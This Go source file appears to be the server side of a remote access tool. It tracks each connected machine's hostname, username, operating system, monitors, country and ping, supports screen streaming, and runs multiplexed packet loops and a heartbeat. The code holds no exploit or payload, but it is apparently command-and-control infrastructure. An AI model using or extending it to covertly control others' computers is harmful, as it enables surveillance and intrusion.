package main

import (
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"rat/command/log"
	"rat/internal"
	"rat/internal/network/header"
	"sync"

	"strconv"
	"strings"
	"time"

	"github.com/xtaci/smux"
)

type Client struct {
	session *smux.Session
	Conn    net.Conn
	stream  *smux.Stream

	Id int

	shared.Computer
	Country     string
	CountryCode string

	Ping struct {
		Start    time.Time
		Current  int
		Received bool
	}

	Screen struct {
		Streaming bool
		New       bool
		Buffer    []byte
	}

	Queue      chan Outgoing
	streamChan chan Channel
	die        chan struct{}
	dieLock    sync.Mutex

	Monitors []shared.Monitor

	Authenticated bool
}

func NewClient(conn net.Conn) *Client {
	client := new(Client)

	client.Queue = make(chan Outgoing)
	client.streamChan = make(chan Channel)
	client.die = make(chan struct{})

	client.Conn = conn
	client.Id = int(rand.Int31())
	client.Computer = shared.Computer{}
	client.Country, client.CountryCode = GetCountry(client.GetIP())
	client.Monitors = make([]shared.Monitor, 0)

	return client
}

func (c *Client) Close(err error) {
	c.dieLock.Lock()
	defer c.dieLock.Unlock()

	select {
	case <-c.die:
	default:
		close(c.die)
		c.Conn.Close()
		log.Println("disconnect", err)
		removeClient(c)
	}
}

func (c *Client) recvLoop() {
	var err error
	for {
		var h header.PacketHeader
		err = binary.Read(c.stream, shared.ByteOrder, &h)

		if err != nil {
			break
		}

		packet, is := incomingPackets[h]
		if !is {
			err = fmt.Errorf("invalid packet header %v", h)
			break
		}

		err = packet.Read(c.stream, c)
		if err != nil {
			break
		}
	}

	select {
	case <-c.die:
	default:
		c.Close(err)
	}
}

func (c *Client) writeLoop() {
	var err error
	for err == nil {
		select {
		case <-c.die:
			return
		case ch := <-c.streamChan:
			stream, err := c.session.OpenStream()
			if err != nil {
				break
			}
			err = c.WriteHeader(ch.Header(), true)
			if err != nil {
				break
			}
			go ch.Open(stream, c)
		case p := <-c.Queue:
			err = c.WriteHeader(p.Header(), false)
			if err != nil {
				break
			}
			err = p.Write(c.stream, c)
			if err != nil {
				break
			}
		}
	}

	c.Close(err)
}

func (c *Client) GetDisplayHost() string {
	return c.Conn.RemoteAddr().String()
}

func (c *Client) GetIP() string {
	return strings.Split(c.Conn.RemoteAddr().String(), ":")[0]
}

// GetFlagName returns the flag filename without extension for the client
// If connection is inside a local network, use "local" icon
// If a country is not found for this clients IP address, return a "unknown" icon
func (c *Client) GetFlagName() string {
	name := strings.ToLower(c.CountryCode)

	if name == "" {
		switch c.GetIP() {
		case "127.0.0.1":
			name = "local"
		default:
			name = "unknown"
		}
	}

	return name
}

// GetCountry returns the full country name for the client
func (c *Client) GetCountry() string {
	name := c.Country

	if name == "" {
		switch c.GetIP() {
		case "127.0.0.1":
			name = "Local Network"
		default:
			name = "Unknown"
		}
	}

	return name
}

// GetPing returns the current ping in milliseconds followed by " ms"
func (c *Client) GetPing() string {
	return strconv.Itoa(c.Ping.Current) + " ms"
}

func (c *Client) GetPathSep() string {
	if c.Computer.OperatingSystemType == shared.Windows {
		return "\\"
	}

	return "/"
}

// Heartbeat pings the client and waits
func (c *Client) Heartbeat() {
	for {
		select {
		case <-c.die:
			return
		default:
			c.Queue <- &Ping{}

			for !c.Ping.Received {
				time.Sleep(time.Millisecond)
			}

			time.Sleep(time.Second * 2)
		}
	}
}

func (c *Client) ReadHeader() (header.PacketHeader, error) {
	var h header.PacketHeader
	err := binary.Read(c.stream, shared.ByteOrder, &h)

	return h, err
}

func (c *Client) WriteHeader(header header.PacketHeader, channel bool) error {
	err := binary.Write(c.stream, shared.ByteOrder, header)

	if err != nil {
		return err
	}

	return binary.Write(c.stream, shared.ByteOrder, channel)
}

func (c *Client) GetClientData() ClientData {
	return ClientData{
		Ping:     c.Ping.Current,
		Country:  c.GetCountry(),
		Flag:     c.GetFlagName(),
		Host:     c.GetDisplayHost(),
		Hostname: c.Computer.Hostname,
		Username: c.Computer.Username,
		Monitors: c.Monitors,
		OperatingSystem: OperatingSystem{
			Type:    c.OperatingSystemType,
			Display: c.Computer.OperatingSystem,
		},
	}
}
